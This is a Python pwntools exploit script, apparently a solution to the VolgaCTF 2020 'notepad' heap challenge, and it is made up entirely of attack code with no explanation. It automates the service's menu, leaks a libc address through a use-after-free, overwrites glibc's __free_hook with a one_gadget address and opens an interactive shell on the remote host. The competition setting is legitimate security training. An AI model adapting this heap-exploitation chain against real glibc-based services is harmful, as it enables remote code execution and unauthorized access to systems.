from pwn import*
context.log_level ='DEBUG'
p = remote('notepad.q.2020.volgactf.ru',45678)
libc = ELF('./libc-2.27.so',checksec=False)
#p = process('./main')
def pick_notebook(index):
	p.sendlineafter('>','p')
	p.sendlineafter('pick:',str(index))
def add_notebook(name):
	p.sendlineafter('>','a')
	p.sendlineafter('name:',name)
def delete_notebook(index):
	p.sendlineafter('>','d')
	p.sendlineafter('delete:',str(index))
def list_notebook():
	p.sendlineafter('>','l')
#---------------
def add(name,size,data):
	p.sendlineafter('>','a')
	p.sendlineafter('name:',name)
	p.sendlineafter('(in bytes):',str(size))
	p.sendafter('data:',data)
def show(index):
	p.sendlineafter('>','v')
	p.sendlineafter('view:',str(index))
def free(index):
	p.sendlineafter('>','d')
	p.sendlineafter('delete:',str(index))
def list():
	p.sendlineafter('>','l')
def edit(index,name,size,data):
	p.sendlineafter('>','u')
	p.sendlineafter('update:',str(index))
	p.sendlineafter('(leave empty to skip):',name)
	p.sendlineafter('the same)',str(size))
	p.sendafter('data:',data)
add_notebook('FMYY')
pick_notebook(1)
add('1',0x500,'FMYY')
add('2',144,'FMYY') #2->1
free(1)
add('2',0x500,'\xA0')
show(2)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.info('LIBC:\t' + hex(libc.address))
free_hook = libc.sym['__free_hook']
og = [0x4F2C5,0x4F322,0x10A38C]
one_gadget = libc.address + og[1]
p.sendlineafter('>','q')
add_notebook('II')
pick_notebook(2)
for i in range(0x10):
	add(p64(free_hook),0x100,'FMYY')
p.sendlineafter('>','q')
pick_notebook(1)
for i in range(0x40-2):
	add('FMYY',0x100,'FMYY')
edit(65,'FMYY',0x10,p64(one_gadget))
free(1)
p.interactive()
